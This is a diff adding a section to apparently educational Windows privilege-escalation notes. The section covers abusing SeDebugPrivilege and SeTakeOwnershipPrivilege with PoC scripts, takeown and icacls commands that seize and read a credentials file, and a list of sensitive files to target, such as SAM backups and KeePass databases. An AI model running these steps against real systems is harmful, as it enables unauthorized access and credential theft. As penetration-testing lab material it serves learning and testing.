@@ -108,3 +108,52 @@ We can also leverage SeDebugPrivilege for RCE. Using this technique, we can elev
 First, transfer this [PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) script over to the target system. Next we just load the script and run it with the following syntax `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,c:\Windows\System32\cmd.exe","")`. Note that we must add a third blank argument "" at the end for the PoC to work properly.
 
 To get the pid, run a `tasklist` command.
+
+# SeTakeOwnershipPrivilege
+It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights.
+The setting can be set in Group Policy under: `Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment`.
+With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).
+
+### PoCs
+[script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
+```powershell
+whoami /priv
+
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+whoami /priv
+
+# Getting a file to confirm ownership
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+# Checking the ownership
+cmd /c dir /q 'C:\Department Shares\Private\IT'
+```
+
+Now using [This](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown)Windows binary file.
+```powershell
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+# Confirming the changes
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+```
+
+### Modifying the File ACL
+```powershell
+cat 'C:\Department Shares\Private\IT\cred.txt'
+
+# Granting access
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+cat 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+### When to use
+#### Files of Interest
+
+Some local files of interest may include:
+
+```shellsession
+c:\inetpub\wwwwroot\web.config %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav`
+
+We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
+```
